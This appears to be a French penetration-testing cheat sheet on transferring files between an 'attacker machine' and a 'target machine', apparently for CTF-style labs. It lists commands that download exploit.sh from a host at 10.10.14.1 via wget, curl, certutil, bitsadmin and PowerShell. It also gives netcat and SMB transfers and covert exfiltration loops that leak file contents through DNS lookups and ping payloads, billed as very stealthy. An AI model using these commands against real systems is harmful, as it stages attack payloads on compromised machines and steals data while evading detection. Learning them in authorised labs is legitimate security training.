Serveur HTTP

Méthode la plus simple et universelle

Recommandé Facile
1

🖥️ Sur votre machine attaquant

Démarrez un serveur HTTP dans le dossier contenant votre fichier

Python 3 (recommandé)
python3 -m http.server 8000
Python 2 (legacy)
python -m SimpleHTTPServer 8000
PHP
php -S 0.0.0.0:8000
Ruby
ruby -run -e httpd . -p 8000
Node.js
npx http-server -p 8000
2

🎯 Sur la machine cible

Téléchargez le fichier depuis votre serveur HTTP

wget (le plus courant)
wget http://10.10.14.1:8000/exploit.sh
curl (alternative)
curl -O http://10.10.14.1:8000/exploit.sh
wget silencieux
wget -q http://10.10.14.1:8000/exploit.sh
PowerShell (Windows 10+)
Invoke-WebRequest -Uri "http://10.10.14.1:8000/exploit.sh" -OutFile "exploit.sh"
PowerShell court
iwr -uri "http://10.10.14.1:8000/exploit.sh" -o "exploit.sh"
certutil (Windows legacy)
certutil -urlcache -split -f "http://10.10.14.1:8000/exploit.sh" exploit.sh
bitsadmin (Windows legacy)
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.14.1:8000/exploit.sh C:\temp\exploit.sh
curl (natif macOS)
curl -O http://10.10.14.1:8000/exploit.sh
📂

Serveur FTP

Transfert via protocole FTP

Réseau Authentification
1

🖥️ Sur votre machine attaquant

Démarrez un serveur FTP temporaire

Python pyftpdlib
python3 -m pyftpdlib -p 21 -w
Pure-FTPd (Linux)
pure-ftpd -j -P 10.10.14.1 -p 30000:30009
2

🎯 Sur la machine cible

Connectez-vous au serveur FTP et téléchargez

Client FTP
ftp 10.10.14.1
💡 Puis utilisez: get exploit.sh
🔐

SCP/SFTP

Transfert sécurisé via SSH

Sécurisé SSH
1

🔄 Transfert bidirectionnel

Utilisez SCP pour transférer des fichiers via SSH

Upload vers la cible
scp exploit.sh user@10.10.14.1:/tmp/
Download depuis la cible
scp user@10.10.14.1:/tmp/exploit.sh .
SFTP interactif
sftp user@10.10.14.1
🔌

Netcat (nc)

Transfert direct via socket TCP

Rapide Discret
1

🖥️ Sur votre machine attaquant

Configurez netcat pour envoyer le fichier

Envoi du fichier
nc -lvnp 8000 < exploit.sh
Netcat traditionnel
nc -l -p 8000 < exploit.sh
2

🎯 Sur la machine cible

Connectez-vous et recevez le fichier

Réception du fichier
nc 10.10.14.1 8000 > exploit.sh
🔤

Encodage Base64

Pour petits fichiers via copier-coller

Très discret Manuel
1

🖥️ Sur votre machine attaquant

Encodez le fichier en Base64

Encodage Base64 (Linux)
base64 -w 0 exploit.sh
Encodage Base64 (macOS)
base64 -i exploit.sh
PowerShell Base64
[Convert]::ToBase64String([IO.File]::ReadAllBytes("exploit.sh"))
💡 Copiez la sortie de cette commande
2

🎯 Sur la machine cible

Décodez et sauvegardez le fichier

Décodage Base64
echo "PASTE_BASE64_HERE" | base64 -d > exploit.sh
PowerShell décodage
[IO.File]::WriteAllBytes("exploit.sh", [Convert]::FromBase64String("PASTE_BASE64_HERE"))
💡 Remplacez PASTE_BASE64_HERE par le contenu copié
📁

Partage SMB

Idéal pour environnements Windows

Windows Réseau
1

🖥️ Sur votre machine attaquant

Créez un partage SMB temporaire

Impacket SMB Server
impacket-smbserver share . -smb2support
SMB avec authentification
impacket-smbserver share . -smb2support -user test -password test
2

🎯 Sur la machine cible Windows

Accédez au partage et copiez le fichier

Copie depuis SMB
copy \\10.10.14.1\share\exploit.sh .
Robocopy (plus robuste)
robocopy \\10.10.14.1\share . exploit.sh
🌐

Exfiltration DNS

Transfert via requêtes DNS (très discret)

Ultra discret Avancé
1

🖥️ Sur votre machine attaquant

Configurez un serveur DNS pour recevoir les données

Serveur DNS simple
sudo tcpdump -i any -s 0 port 53
2

🎯 Sur la machine cible

Exfiltrez le fichier via requêtes DNS

Exfiltration DNS
for i in $(base64 -w 0 exploit.sh | fold -w 32); do nslookup $i.10.10.14.1; done
📡

Exfiltration ICMP

Transfert via paquets ping

Très discret Créatif
1

🖥️ Sur votre machine attaquant

Écoutez les paquets ICMP

Capture ICMP
sudo tcpdump -i any icmp
2

🎯 Sur la machine cible

Envoyez le fichier via ping

Exfiltration ICMP
xxd -p -c 16 exploit.sh | while read line; do ping -c 1 -p $line 10.10.14.1; done
